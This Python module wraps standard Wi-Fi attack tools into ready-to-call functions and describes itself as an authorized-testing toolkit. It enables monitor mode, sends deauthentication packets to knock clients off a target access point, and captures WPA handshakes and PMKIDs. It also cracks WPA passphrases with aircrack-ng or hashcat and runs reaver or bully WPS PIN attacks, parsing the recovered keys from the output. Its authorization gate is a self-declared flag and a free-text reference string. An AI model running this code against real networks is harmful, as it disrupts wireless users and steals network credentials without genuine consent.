"""Authorized active Wi-Fi testing — the full engagement toolkit.

For networks the operator OWNS or is explicitly authorized (in writing) to test.
Every active operation is gated behind an authorization confirmation and an
engagement reference, and executes the standard Kali tools on the operator's own
adapter: airmon-ng (monitor mode), aireplay-ng (targeted deauth to force a
handshake), airodump-ng / hcxdumptool (handshake & PMKID capture), aircrack-ng /
hashcat (WPA dictionary cracking), reaver / bully (WPS), and wifite (automation).

The network calls are real; the subprocess runner is injectable so tests never
touch radio hardware. Deauthentication is targeted at a specified BSSID and
bounded in packet count — it is the capture-assist step of an authorized test,
not an open-ended jamming primitive.
"""
from __future__ import annotations

import os
import re
import subprocess
import tempfile

_BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
_IFACE_RE = re.compile(r"^[A-Za-z0-9_]+$")
MAX_DEAUTH = 64
MAX_CAPTURE_SECONDS = 300


def _require_auth(data: dict) -> str:
    if not isinstance(data, dict):
        raise ValueError("Request must be a JSON object.")
    if data.get("authorizationConfirmed") is not True or data.get("confirmRun") is not True:
        raise ValueError("Confirm you own or are authorized to test this network, and approve the run.")
    ref = data.get("authorizationReference")
    if not isinstance(ref, str) or not ref.strip() or len(ref) > 160:
        raise ValueError("A valid engagement / authorization reference is required.")
    return ref.strip()


def _iface(name) -> str:
    if not isinstance(name, str) or not _IFACE_RE.match(name):
        raise ValueError("A valid interface name is required.")
    return name


def _bssid(mac) -> str:
    if not isinstance(mac, str) or not _BSSID_RE.match(mac):
        raise ValueError("A valid BSSID (AA:BB:CC:DD:EE:FF) is required.")
    return mac


def _run(runner, args, timeout):
    try:
        proc = runner(args, capture_output=True, text=True, timeout=timeout)
    except (FileNotFoundError, OSError, subprocess.SubprocessError) as exc:
        return None, str(exc)[:200]
    return proc, None


def enable_monitor(interface: str, runner=subprocess.run) -> dict:
    """Put an adapter into monitor mode (airmon-ng start)."""
    iface = _iface(interface)
    proc, err = _run(runner, ["airmon-ng", "start", iface], 30)
    if err:
        return {"status": "error", "error": err}
    out = getattr(proc, "stdout", "") or ""
    m = re.search(r"(?:monitor mode (?:vif )?enabled (?:for [^ ]+ )?on \[?\w+\]?(\w+)|(\w+mon))", out)
    mon = (m.group(1) or m.group(2)) if m else iface + "mon"
    return {"status": "ok", "interface": iface, "monitor": mon, "output": out[:500]}


def disable_monitor(interface: str, runner=subprocess.run) -> dict:
    """Return an adapter to managed mode (airmon-ng stop)."""
    iface = _iface(interface)
    proc, err = _run(runner, ["airmon-ng", "stop", iface], 30)
    return {"status": "error", "error": err} if err else {"status": "ok", "interface": iface}


def deauth(data: dict, runner=subprocess.run) -> dict:
    """Targeted, bounded deauthentication to force a client to reassociate."""
    ref = _require_auth(data)
    iface = _iface(data.get("interface"))
    bssid = _bssid(data.get("bssid"))
    count = data.get("count", 5)
    if isinstance(count, bool) or not isinstance(count, int) or not 1 <= count <= MAX_DEAUTH:
        raise ValueError(f"Deauth count must be between 1 and {MAX_DEAUTH}.")
    args = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    client = data.get("client")
    if client:
        args += ["-c", _bssid(client)]
    args.append(iface)
    proc, err = _run(runner, args, 60)
    if err:
        return {"status": "error", "error": err}
    return {"status": "completed", "authorizationReference": ref, "command": args,
            "output": (getattr(proc, "stdout", "") or "")[:500]}


def capture_handshake(data: dict, runner=subprocess.run) -> dict:
    """Capture a WPA 4-way handshake for a target AP (optionally deauth-assisted)."""
    ref = _require_auth(data)
    iface = _iface(data.get("interface"))
    bssid = _bssid(data.get("bssid"))
    channel = str(data.get("channel", "")).strip()
    if not re.match(r"^\d{1,3}$", channel):
        raise ValueError("A valid channel number is required.")
    seconds = data.get("seconds", 30)
    if isinstance(seconds, bool) or not isinstance(seconds, int) or not 10 <= seconds <= MAX_CAPTURE_SECONDS:
        raise ValueError(f"Capture seconds must be between 10 and {MAX_CAPTURE_SECONDS}.")
    workdir = tempfile.mkdtemp(prefix="cyberlab_hs_")
    prefix = os.path.join(workdir, "handshake")

    commands = []
    if data.get("deauth"):
        d_args = ["aireplay-ng", "--deauth", str(min(int(data.get("deauthCount", 5)), MAX_DEAUTH)), "-a", bssid, iface]
        commands.append(d_args)
        _run(runner, d_args, 60)
    cap_args = ["timeout", str(seconds), "airodump-ng", "--bssid", bssid, "-c", channel,
                "-w", prefix, "--output-format", "pcap,csv", iface]
    commands.append(cap_args)
    _run(runner, cap_args, seconds + 20)

    capture_file = prefix + "-01.cap"
    captured = False
    if os.path.isfile(capture_file):
        check, _ = _run(runner, ["aircrack-ng", capture_file], 30)
        text = (getattr(check, "stdout", "") or "") if check else ""
        captured = ("1 handshake" in text) or ("WPA (1 handshake" in text) or bool(re.search(r"\b1 handshake", text))
    return {"status": "completed", "authorizationReference": ref, "capturePath": capture_file,
            "handshakeCaptured": captured, "commands": commands,
            "note": "Handshake captured." if captured else "No handshake confirmed yet; retry with a connected client or deauth assist."}


def capture_pmkid(data: dict, runner=subprocess.run) -> dict:
    """Clientless PMKID capture via hcxdumptool (no client needed)."""
    ref = _require_auth(data)
    iface = _iface(data.get("interface"))
    seconds = data.get("seconds", 30)
    if isinstance(seconds, bool) or not isinstance(seconds, int) or not 10 <= seconds <= MAX_CAPTURE_SECONDS:
        raise ValueError(f"Capture seconds must be between 10 and {MAX_CAPTURE_SECONDS}.")
    out = os.path.join(tempfile.mkdtemp(prefix="cyberlab_pmkid_"), "pmkid.pcapng")
    args = ["timeout", str(seconds), "hcxdumptool", "-i", iface, "--enable_status=1", "-w", out]
    proc, err = _run(runner, args, seconds + 20)
    if err:
        return {"status": "error", "error": err}
    return {"status": "completed", "authorizationReference": ref, "capturePath": out, "command": args,
            "note": "Convert with hcxpcapngtool, then crack with hashcat -m 22000."}


def crack_wpa(data: dict, runner=subprocess.run) -> dict:
    """WPA dictionary crack of a supplied capture, via aircrack-ng or hashcat."""
    ref = _require_auth(data)
    capture = data.get("capturePath")
    wordlist = data.get("wordlistPath")
    for label, path in (("capture", capture), ("wordlist", wordlist)):
        if not isinstance(path, str) or not path:
            raise ValueError(f"A {label} file path is required.")
        if not os.path.isfile(path):
            raise ValueError(f"The {label} file was not found: {path}")
    tool = data.get("tool", "aircrack")
    if tool == "hashcat":
        args = ["hashcat", "-m", "22000", "-a", "0", capture, wordlist, "--potfile-disable", "--quiet"]
        proc, err = _run(runner, args, data.get("timeout", 3600))
        out = (getattr(proc, "stdout", "") or "") if not err else ""
        m = re.search(r":([^:\n]+)\s*$", out.strip()) if out else None
        key = m.group(1) if m else None
    else:
        args = ["aircrack-ng", capture, "-w", wordlist]
        proc, err = _run(runner, args, data.get("timeout", 3600))
        out = (getattr(proc, "stdout", "") or "") if not err else ""
        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
        key = m.group(1) if m else None
    if err:
        return {"status": "error", "error": err}
    return {"status": "completed", "authorizationReference": ref, "keyFound": bool(key), "key": key,
            "tool": tool, "note": ("Passphrase recovered — it is weak; change it." if key else "No wordlist match.")}


def wps_attack(data: dict, runner=subprocess.run) -> dict:
    """WPS PIN attack (reaver Pixie-Dust by default, or bully) against an authorized AP."""
    ref = _require_auth(data)
    iface = _iface(data.get("interface"))
    bssid = _bssid(data.get("bssid"))
    tool = data.get("tool", "reaver")
    timeout = min(int(data.get("timeout", 600)), 3600)
    if tool == "bully":
        args = ["bully", "-b", bssid, "-d", iface]
    else:
        args = ["reaver", "-i", iface, "-b", bssid, "-K", "1", "-vvv"]  # -K 1 = Pixie-Dust
    proc, err = _run(runner, args, timeout)
    if err:
        return {"status": "error", "error": err}
    out = getattr(proc, "stdout", "") or ""
    pin = re.search(r"WPS PIN:\s*'?(\d{8})'?", out)
    psk = re.search(r"WPA PSK:\s*'?(.+?)'?\s*$", out, re.MULTILINE)
    return {"status": "completed", "authorizationReference": ref, "tool": tool,
            "wpsPin": pin.group(1) if pin else None, "psk": psk.group(1) if psk else None,
            "output": out[:800]}


def auto_audit(data: dict, runner=subprocess.run) -> dict:
    """Automated end-to-end audit of an authorized target via wifite."""
    ref = _require_auth(data)
    iface = _iface(data.get("interface"))
    args = ["wifite", "-i", iface, "--kill"]
    bssid = data.get("bssid")
    if bssid:
        args += ["--bssid", _bssid(bssid)]
    wordlist = data.get("wordlistPath")
    if isinstance(wordlist, str) and wordlist:
        if not os.path.isfile(wordlist):
            raise ValueError("Wordlist file not found.")
        args += ["--dict", wordlist]
    proc, err = _run(runner, args, min(int(data.get("timeout", 1800)), 7200))
    if err:
        return {"status": "error", "error": err}
    return {"status": "completed", "authorizationReference": ref, "command": args,
            "output": (getattr(proc, "stdout", "") or "")[:1500]}
